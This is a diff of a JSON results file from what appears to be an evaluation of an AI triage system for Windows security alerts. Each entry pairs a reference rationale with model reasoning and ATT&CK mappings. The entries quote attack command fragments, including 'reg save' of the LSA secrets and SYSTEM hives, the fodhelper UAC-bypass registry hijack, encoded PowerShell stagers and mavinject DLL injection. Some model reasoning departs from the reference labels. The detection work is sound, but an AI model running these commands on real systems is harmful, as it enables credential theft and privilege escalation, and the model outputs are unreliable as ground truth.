+        "68c8acb4-1b60-4890-8e82-3ddf7a6dba84",
+        "84b1706c-932a-44c4-ae28-892b28a25b94",
+        "e8a95b5e-c891-46e2-b33a-93937d3abc31",
+        "f57c58b3-ee69-4ef5-9041-455bf39aaa89"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4449,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:42:00+00:00"
+    },
+    "day3-046": {
+      "label_rationale": "DFS Replication service on a domain controller updating its own replication-group configuration, expected on a DC.",
+      "reasoning": "The DFSR service executable (C:\\Windows\\system32\\DFSRs.exe) is modifying a registry value under its own service key (HKLM\\System\\CurrentControlSet\\Services\\DFSR\\Parameters\\Replication Groups\\...\\Replica Set Configuration File) with a path to its configuration file in the System Volume Information folder. This is normal operation of the DFSR service, not indicative of malicious registry hijacking or service abuse.",
+      "retrieved_techniques": [
+        "T1574.011",
+        "T1490",
+        "T1003.006",
+        "T1222.001",
+        "T1207"
+      ],
+      "retrieved_rules": [
+        "c7dcacd0-cc59-4004-b0a4-1d6cdebe6f3e",
+        "d6c2ce7e-afb5-4337-9ca4-4b5254ed0565",
+        "a07f0359-4c90-4dc4-a681-8ffea40b4f47",
+        "612e47e9-8a59-43a6-b404-f48683f45bd6",
+        "cbf93e5d-ca6c-4722-8bea-e9119007c248"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4098,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:42:08+00:00"
+    },
+    "day3-052": {
+      "label_rationale": "cmd.exe /c MSBuild.exe pshell.xml spawned by WmiPrvSE means the build command was started through WMI.",
+      "reasoning": "The WMI provider host (WmiPrvSE.exe) spawned cmd.exe, which executed MSBuild.exe with an XML file in Tasks directory, indicating abuse of WMI for execution (T1047) and use of MSBuild to run code (T1127.001).",
+      "retrieved_techniques": [
+        "T1127.001",
+        "T1546.003",
+        "T1218.014",
+        "T1047",
+        "T1218.004"
+      ],
+      "retrieved_rules": [
+        "692f0bec-83ba-4d04-af7e-e884a96059b6",
+        "4a2a2c3e-209f-4d01-b513-4155a540b469",
+        "d21374ff-f574-44a7-9998-4a8c8bf33d7d",
+        "1dd05363-104e-4b4a-b963-196a534b03a1",
+        "c27515df-97a9-4162-8a60-dc0eeb51b775"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4082,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:42:16+00:00"
+    },
+    "day3-054": {
+      "label_rationale": "launcher.exe run by the user from the Administrator's Desktop is the Empire stager executable.",
+      "reasoning": "The parent process explorer.exe was started with the /NoUACCheck flag, which is a known UAC bypass technique (T1548.002). This flag allows child processes to run without UAC prompts, and the child process launcher.exe was executed from the user's desktop under this elevated context.",
+      "retrieved_techniques": [
+        "T1547.001",
+        "T1564.003",
+        "T1547.004",
+        "T1546.008",
+        "T1036.007"
+      ],
+      "retrieved_rules": [
+        "534f2ef7-e8a2-4433-816d-c91bccde289b",
+        "c3d76afc-93df-461e-8e67-9b2bad3f2ac4",
+        "84232095-ecca-4015-b0d7-7726507ee793",
+        "39ed3c80-e6a1-431b-9df3-911ac53d08a7",
+        "4281cb20-2994-4580-aa63-c8b86d019934"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4165,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:42:25+00:00"
+    },
+    "day3-058": {
+      "label_rationale": "net user run from PowerShell enumerates local accounts.",
+      "reasoning": "The alert shows a PowerShell process launched with -noP -sta -w 1 -enc (encoded command) which then spawned net.exe executing 'net user', indicating malicious PowerShell execution leading to account discovery activity.",
+      "retrieved_techniques": [
+        "T1059.001",
+        "T1216.002",
+        "T1136.001",
+        "T1218.014",
+        "T1546.002"
+      ],
+      "retrieved_rules": [
+        "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+        "b9f0e6f5-09b4-4358-bae4-08408705bd5c",
+        "fb843269-508c-4b76-8b8d-88679db22ce7",
+        "d4498716-1d52-438f-8084-4a603157d131",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 7875,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:42:37+00:00"
+    },
+    "day3-066": {
+      "label_rationale": "PowerShell writes the ms-settings/Shell/Open/command default value to run PowerShell, the fodhelper UAC-bypass hijack.",
+      "reasoning": "The event shows PowerShell modifying the registry key HKU\\..._Classes\\ms-settings\\Shell\\Open\\command\\(Default) to execute a hidden PowerShell command that retrieves and runs an encoded payload, which matches the technique of changing default file association for UAC bypass and persistence.",
+      "retrieved_techniques": [
+        "T1546.001",
+        "T1564.003",
+        "T1218.014",
+        "T1216.002",
+        "T1546.008"
+      ],
+      "retrieved_rules": [
+        "8d85cf08-bf97-4260-ba49-986a2a65129c",
+        "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd",
+        "9df5f547-c86a-433e-b533-f2794357e242",
+        "f59c3faf-50f3-464b-9f4c-1b67ab512d99",
+        "5b872a46-3b90-45c1-8419-f675db8053aa"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4177,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:42:45+00:00"
+    },
+    "day3-077": {
+      "label_rationale": "Hidden PowerShell (-NoP -NonI -W Hidden) launched by fodhelper.exe, running with elevated rights.",
+      "reasoning": "The trusted Windows binary fodhelper.exe is observed spawning PowerShell with hidden window and an encoded command, matching the known fodhelper UAC bypass technique. The PowerShell command reads a base64-encoded payload from the registry and executes it, indicating malicious execution and obfuscation.",
+      "retrieved_techniques": [
+        "T1216.002",
+        "T1564.003",
+        "T1546.008",
+        "T1059.001",
+        "T1218.004"
+      ],
+      "retrieved_rules": [
+        "3268b746-88d8-4cd3-bffc-30077d02c787",
+        "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+        "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
+        "6385697e-9f1b-40bd-8817-f4a91f40508e",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4726,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:42:56+00:00"
+    },
+    "day3-081": {
+      "label_rationale": "PsExec -s runs 'reg save HKLM/security/policy/secrets' as SYSTEM, exporting the LSA secrets hive that holds service-account credentials.",
+      "reasoning": "The event shows PsExec.exe executed from a user's Downloads directory, running reg save with the -s flag to dump the HKLM\\SECURITY\\Policy\\Secrets registry hive (LSA secrets) to a file in the user's temp folder. This behavior matches adversarial credential access via LSA Secrets extraction (T1003.004).",
+      "retrieved_techniques": [
+        "T1003.002",
+        "T1003.004",
+        "T1547.001",
+        "T1003.001",
+        "T1204.002"
+      ],
+      "retrieved_rules": [
+        "62e0298b-e994-4189-bc87-bc699aa62d97",
+        "8834e2f7-6b4b-4f09-8906-d2276470ee23",
+        "efec536f-72e8-4656-8960-5e85d091345b",
+        "1c0e41cd-21bb-4433-9acc-4a2cd6367b9b",
+        "c80e66d8-1780-48a9-b412-46663fd21ac0"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4130,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:43:05+00:00"
+    },
+    "day3-082": {
+      "label_rationale": "PowerShell -noP -sta -w 1 -enc (encoded stager) launched by the service-spawned cmd.exe.",
+      "reasoning": "The alert shows a cmd.exe process launching powershell.exe with the -enc flag and a large Base64-encoded command line, indicating execution of obfuscated PowerShell code. The parent cmd.exe uses /C start /b to hide the window, a common technique for stealthy execution. This matches adversary use of PowerShell for execution (T1059.001).",
+      "retrieved_techniques": [
+        "T1059.001",
+        "T1216.002",
+        "T1059.003",
+        "T1546.008",
+        "T1574.008"
+      ],
+      "retrieved_rules": [
+        "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+        "ab37a6ec-6068-432b-a64e-2c7bf95b1d22",
+        "fb843269-508c-4b76-8b8d-88679db22ce7",
+        "5a6b7c8d-9e0f-1a2b-3c4d-5e6f7a8b9c0d",
+        "058f4380-962d-40a5-afce-50207d36d7e2"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 18118,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:43:46+00:00"
+    },
+    "day3-083": {
+      "label_rationale": "control.exe loads C:/ProgramData/calc.cpl, executing a Control Panel item DLL from a non-standard location.",
+      "reasoning": "The event shows powershell.exe launching control.exe with a .cpl file located in ProgramData, a non-standard location for Control Panel items. This matches the abuse of control.exe to execute arbitrary .cpl payloads (T1218.002). The parent process is powershell, indicating scripted execution of a potentially malicious Control Panel item.",
+      "retrieved_techniques": [
+        "T1218.002",
+        "T1218.011",
+        "T1059.001",
+        "T1547.001",
+        "T1218.004"
+      ],
+      "retrieved_rules": [
+        "e593cf51-88db-4ee1-b920-37e89012a3c9",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "438025f9-5856-4663-83f7-52f878a70a50",
+        "c27515df-97a9-4162-8a60-dc0eeb51b775"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4458,
+      "git_sha": "b68422321372922e158eb8b69e53b6d901c63a74",
+      "git_dirty": false,
+      "at": "2026-10-04T11:43:57+00:00"
+    },
+    "day3-084": {
+      "label_rationale": "Windows Update Session Orchestrator client (StartUWork), signed, launched by svchost.",
+      "reasoning": "UsoClient.exe is a legitimate Windows Update Orchestrator client, launched by the Schedule service (svchost.exe) via Task Scheduler with a normal command line 'StartUWork', indicating routine Windows Update activity rather than malicious behavior.",
+      "retrieved_techniques": [
+        "T1053.005",
+        "T1053",
+        "T1036.005",
+        "T1547.010",
+        "T1124"
+      ],
+      "retrieved_rules": [
+        "81325ce1-be01-4250-944f-b4789644556f",
+        "92626ddd-662c-49e3-ac59-f6535f12d189",
+        "9f8573c9-22b4-40e3-89c1-72bc2b8d49ab",
+        "24c8392b-aa3c-46b7-a545-43f71657fe98",
+        "534f2ef7-e8a2-4433-816d-c91bccde289b"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 3900,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:05:23+00:00"
+    },
+    "day3-085": {
+      "label_rationale": "InstallUtil.exe opening an outbound HTTP connection to 10.10.10.5 is the loaded payload beaconing, since InstallUtil normally never talks to the network.",
+      "reasoning": "InstallUtil.exe is a signed Windows utility commonly abused to proxy execution of malicious .NET code (T1218.004). The observed outbound HTTP connection to an internal IP on port 80 is atypical for InstallUtil, suggesting it is being used to download or communicate with payload, indicating adversary use.",
+      "retrieved_techniques": [
+        "T1218.004",
+        "T1070.007",
+        "T1049",
+        "T1547.010",
+        "T1205"
+      ],
+      "retrieved_rules": [
+        "5c80b618-0dbb-46e6-acbb-03d90bcb6d83",
+        "efafe0bf-4238-479e-af8f-797bd3490d2d",
+        "0dba975d-a193-4ed1-a067-424df57570d1",
+        "08249dc0-a28d-4555-8ba5-9255a198e08c",
+        "0531e43a-d77d-47c2-b89f-5fe50321c805"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4252,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:05:38+00:00"
+    },
+    "day3-092": {
+      "label_rationale": "Outflank-Dumpert is an offensive tool that dumps LSASS memory using direct syscalls to evade EDR hooks.",
+      "reasoning": "The event shows a user executing Outflank-Dumpert.exe from the desktop via cmd.exe, which is a known tool for dumping LSASS memory to obtain credentials. The parent process is cmd.exe, indicating command shell usage to launch the malicious executable.",
+      "retrieved_techniques": [
+        "T1204.002",
+        "T1059.003",
+        "T1546.008",
+        "T1003.001",
+        "T1218.014"
+      ],
+      "retrieved_rules": [
+        "2704ab9e-afe2-4854-a3b1-0c0706d03578",
+        "044ba588-dff4-4918-9808-3f95e8160606",
+        "502b42de-4306-40b4-9596-6f590c81f073",
+        "f26307d8-14cd-47e3-a26b-4b4769f24af6",
+        "8e0bb260-d4b2-4fff-bb8d-3f82118e6892"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4160,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:05:50+00:00"
+    },
+    "day3-094": {
+      "label_rationale": "cmstp.exe /s /au with a crafted .inf in ProgramData, named T1218.003_uacbypass, installs a malicious connection profile.",
+      "reasoning": "PowerShell.exe launched cmstp.exe with an INF file from ProgramData, indicating abuse of CMSTP for proxy execution (T1218.003). The use of PowerShell to launch the binary shows execution via PowerShell (T1059.001).",
+      "retrieved_techniques": [
+        "T1218",
+        "T1218.003",
+        "T1059.001",
+        "T1218.014",
+        "T1546.008"
+      ],
+      "retrieved_rules": [
+        "01c42d3c-242d-4655-85b2-34f1739632f7",
+        "02b18447-ea83-4b1b-8805-714a8a34546a",
+        "04936b66-3915-43ad-a8e5-809eadfd1141",
+        "0b4ae027-2a2d-4b93-8c7e-962caaba5b2a",
+        "0bbc6369-43e3-453d-9944-cae58821c173"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4168,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:06:14+00:00"
+    },
+    "day3-098": {
+      "label_rationale": "PowerShell -noP -sta -w 1 -enc (encoded stager) started by wsmprovhost is a remote WinRM session.",
+      "reasoning": "The process was spawned by wsmprovhost.exe (WinRM plugin host), indicating a remote PowerShell session via WinRM. The PowerShell command line includes the -enc flag with a large Base64-encoded script, typical of malicious payload execution.",
+      "retrieved_techniques": [
+        "T1021.006",
+        "T1218.014",
+        "T1216.002",
+        "T1047",
+        "T1059.001"
+      ],
+      "retrieved_rules": [
+        "734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8",
+        "5cc2cda8-f261-4d88-a2de-e9e193c86716",
+        "79f4ede3-402e-41c8-bc3e-ebbf5f162581",
+        "fb843269-508c-4b76-8b8d-88679db22ce7",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 17836,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:07:54+00:00"
+    },
+    "day3-118": {
+      "label_rationale": "reg save HKLM/SYSTEM to C:/Windows/Temp/SYSTEM_HIVE exports the boot-key hive used to decrypt stolen credential databases; per ATT&CK the SYSTEM hive save is filed under SAM (T1003.002).",
+      "reasoning": "The reg.exe process is saving the HKLM\\SYSTEM hive to a temporary file, which is indicative of dumping sensitive registry hives for credential access, matching the Sigma rule for Dumping of Sensitive Hives Via Reg.EXE.",
+      "retrieved_techniques": [
+        "T1552.002",
+        "T1003.002",
+        "T1547.001",
+        "T1547.010",
+        "T1574.008"
+      ],
+      "retrieved_rules": [
+        "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+        "62e0298b-e994-4189-bc87-bc699aa62d97",
+        "e0b0c2ab-3d52-46d9-8cb7-049dc775fbd1",
+        "cc1abf27-78a3-4ac5-a51c-f3070b1d8e40",
+        "0ba863e6-def5-4e50-9cea-4dd8c7dc46a4"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4116,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:08:07+00:00"
+    },
+    "day3-119": {
+      "label_rationale": "cmd.exe /c spawned by mshta.exe running an .hta: the HTML application host launching a shell.",
+      "reasoning": "The parent mshta.exe executed an HTA file from the user's startup folder, indicating abuse of mshta for execution and persistence via startup folder. The mshta process then spawned cmd.exe with '/c calc.exe', showing use of the Windows command shell to launch a program.",
+      "retrieved_techniques": [
+        "T1218.005",
+        "T1547.001",
+        "T1574.008",
+        "T1218.014",
+        "T1059.003"
+      ],
+      "retrieved_rules": [
+        "03cc0c25-389f-4bf8-b48d-11878079f1ca",
+        "67f113fa-e23d-4271-befa-30113b3e08b1",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "b98d0db6-511d-45de-ad02-e82a98729620",
+        "cc7abbd0-762b-41e3-8a26-57ad50d2eea3"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4403,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:08:28+00:00"
+    },
+    "day3-132": {
+      "label_rationale": "mavinject.exe /INJECTRUNNING injects C:/ProgramData/T1055.dll into a running notepad process, proxy DLL injection.",
+      "reasoning": "The event shows powershell.exe spawning mavinject.exe which injects the DLL C:\\ProgramData\\T1055.dll into PID 3440, indicating abuse of a signed Windows binary for process injection.",
+      "retrieved_techniques": [
+        "T1055",
+        "T1218.013",
+        "T1059.001",
+        "T1547.010",
+        "T1216.002"
+      ],
+      "retrieved_rules": [
+        "16c37b52-b141-42a5-a3ea-bbe098444397",
+        "1cc50f3f-1fc8-4acf-b2e9-6f172e1fdebd",
+        "396f6630-f3ac-44e3-bfc8-1b161bc00c4e",
+        "3c1b5fb0-c72f-45ba-abd1-4d4c353144ab",
+        "71158e3f-df67-472b-930e-7d287acaa3e1"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4906,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:08:53+00:00"
+    },
+    "day3-134": {
+      "label_rationale": "Windows background task host for an installed app, signed, launched by svchost, normal UWP behavior.",
+      "reasoning": "The event shows a legitimate Windows process backgroundTaskHost.exe launched by svchost.exe via DCOM with a ServerName argument referencing an AppX package, consistent with normal background task host usage; there is no indication of malicious abuse.",
+      "retrieved_techniques": [
+        "T1021.003",
+        "T1036.005",
+        "T1218.014",
+        "T1559.001",
+        "T1546.008"
+      ],
+      "retrieved_rules": [
+        "cbb9e3d1-2386-4e59-912e-62f1484f7a89",
+        "f1f3bf22-deb2-418d-8cce-e1a45e46a5bd",
+        "2dbd9d3d-9e27-42a8-b8df-f13825c6c3d5",
+        "982e9f2d-1a85-4d5b-aea4-31f5e97c6555",
+        "d06be4b9-8045-428b-a567-740a26d9db25"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4057,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:09:11+00:00"
+    },
+    "day3-137": {
+      "label_rationale": "PurpleSharp /t T1110.003,T1558.003,T1135,T1021.006 is an adversary-simulation tool running password spraying, Kerberoasting, share discovery and WinRM.",
+      "reasoning": "The event shows execution of PurpleSharp.exe, a known adversary emulation/hacktool, from the user's Downloads directory via cmd.exe, with command-line arguments listing ATT&CK technique IDs. This indicates legitimate security testing activity rather than malicious adversary behavior, with no evidence of malicious payload or suspicious network activity.",
+      "retrieved_techniques": [
+        "T1021.006",
+        "T1110.003",
+        "T1135",
+        "T1558.003",
+        "T1546.008"
+      ],
+      "retrieved_rules": [
+        "12827a56-61a4-476a-a9cb-f3068f191073",
+        "1eeed653-dbc8-4187-ad0c-eeebb20e6599",
+        "54773c5f-f1cc-4703-9126-2f797d96a69d",
+        "734f8d9b-42b8-41b2-bcf5-abaf49d5a3c8",
+        "79df3f68-dccb-48e9-9171-b75cbc37c51d"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4333,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:25:48+00:00"
+    },
+    "day3-150": {
+      "label_rationale": "Windows Error Reporting started by svchost to snapshot a crashed process, signed, in System32.",
+      "reasoning": "WerFault.exe is launched by the Windows Error Reporting service (svchost.exe -k WerSvcGroup) with typical error reporting flags (-pss -s 460 -p 5728 -ip 5728), not the flags used for LSASS dumping. This matches normal WerFault behavior and shows no signs of malicious abuse.",
+      "retrieved_techniques": [
+        "T1003.001",
+        "T1546.002",
+        "T1547.010",
+        "T1036.005",
+        "T1218.008"
+      ],
+      "retrieved_rules": [
+        "fabfb3a7-3ce1-4445-9c7c-3c27f1051cdd",
+        "9a4ccd1a-3526-4d99-b980-9f9c5d3a6ff3",
+        "cbb9e3d1-2386-4e59-912e-62f1484f7a89",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "6f0947a4-1c5e-4e0d-8ac7-53159b8f23ca"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4279,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:10:53+00:00"
+    },
+    "day3-152": {
+      "label_rationale": "MoveWMI.exe <IP> is a tool that installs a WMI event subscription on a remote host.",
+      "reasoning": "The user launched a non-system executable MoveWMI.exe from the desktop via PowerShell, passing an external IP address as an argument, indicating execution of a potentially malicious tool for lateral movement. The parent PowerShell process shows the attack used PowerShell for execution (T1059.001).",
+      "retrieved_techniques": [
+        "T1216.002",
+        "T1563.002",
+        "T1059.001",
+        "T1546.008",
+        "T1218.014"
+      ],
+      "retrieved_rules": [
+        "fb9d3ff7-7348-46ab-af8c-b55f5fbf39b4",
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180",
+        "0944e002-e3f6-4eb5-bf69-3a3067b53d73",
+        "fb843269-508c-4b76-8b8d-88679db22ce7"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4208,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:11:11+00:00"
+    },
+    "day3-153": {
+      "label_rationale": "winlogon.exe recording password-expiry notification state under its own Winlogon key, standard logon behavior.",
+      "reasoning": "Winlogon.exe updating the PasswordExpiryNotification\\\\NotShownTime value under the user's HKU hive is a normal Windows operation for tracking password expiry notifications, not indicative of malicious abuse of Winlogon.",
+      "retrieved_techniques": [
+        "T1547.004",
+        "T1546.008",
+        "T1556.008",
+        "T1546.002",
+        "T1547.001"
+      ],
+      "retrieved_rules": [
+        "bbf59793-6efb-4fa1-95ca-a7d288e52c88",
+        "cbf93e5d-ca6c-4722-8bea-e9119007c248",
+        "f8aebc67-a56d-4ec9-9fbe-7b0e8b7b4efd",
+        "20f0ee37-5942-4e45-b7d5-c5b5db9df5cd",
+        "b29aed60-ebd1-442b-9cb5-16a1d0324adb"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4165,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:11:32+00:00"
+    },
+    "day3-154": {
+      "label_rationale": "cmd.exe /c spawned by GruntHTTP.exe, a Covenant C2 implant, to launch InstallUtil.",
+      "reasoning": "The parent GruntHTTP.exe spawned cmd.exe, which executed InstallUtil.exe with the /u flag to uninstall a DLL from ProgramData, demonstrating abuse of a trusted Windows binary to execute code (T1218.004) via a command shell (T1059.003).",
+      "retrieved_techniques": [
+        "T1218.004",
+        "T1574.008",
+        "T1546.008",
+        "T1547.004",
+        "T1547.001"
+      ],
+      "retrieved_rules": [
+        "d042284c-a296-4988-9be5-f424fadcc28c",
+        "75edd216-1939-4c73-8d61-7f3a0d85b5cc",
+        "6120ac2a-a34b-42c0-a9bd-1fb9f459f348",
+        "3c1b5fb0-c72f-45ba-abd1-4d4c353144ab",
+        "dcaa3f04-70c3-427a-80b4-b870d73c94c4"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 4648,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:11:51+00:00"
+    },
+    "day3-173": {
+      "label_rationale": "wardog.exe is the herpaderped process, running mimikatz code under a benign-looking image.",
+      "reasoning": "The parent process ProcessHerpaderping.exe executes from the user's Desktop with arguments that include mimikatz.exe and wardog.exe, indicating use of a process herpaderping technique to run malicious tools. The child process wardog.exe is launched from the same suspicious location, consistent with payload execution. This shows defense evasion and credential access, indicative of adversary behavior.",
+      "retrieved_techniques": [
+        "T1546.002",
+        "T1564.003",
+        "T1204.002",
+        "T1546.008",
+        "T1218.014"
+      ],
+      "retrieved_rules": [
+        "e4a6b256-3e47-40fc-89d2-7a477edd6915",
+        "3dfd06d2-eaf4-4532-9555-68aca59f57c4",
+        "961e0abb-1b1e-4c84-a453-aafe56ad0d34",
+        "b730a276-6b63-41b8-bcf8-55930c8fc6ee",
+        "8de89e52-f6e1-4b5b-afd1-41ecfa300d48"
+      ],
+      "escalation": null,
+      "lookups": [],
+      "tokens": 5867,
+      "git_sha": "403d67c53f2ca2de4cc5ea9126dd9a213f449178",
+      "git_dirty": false,
+      "at": "2026-10-06T15:12:25+00:00"
+    }
+  }
+}
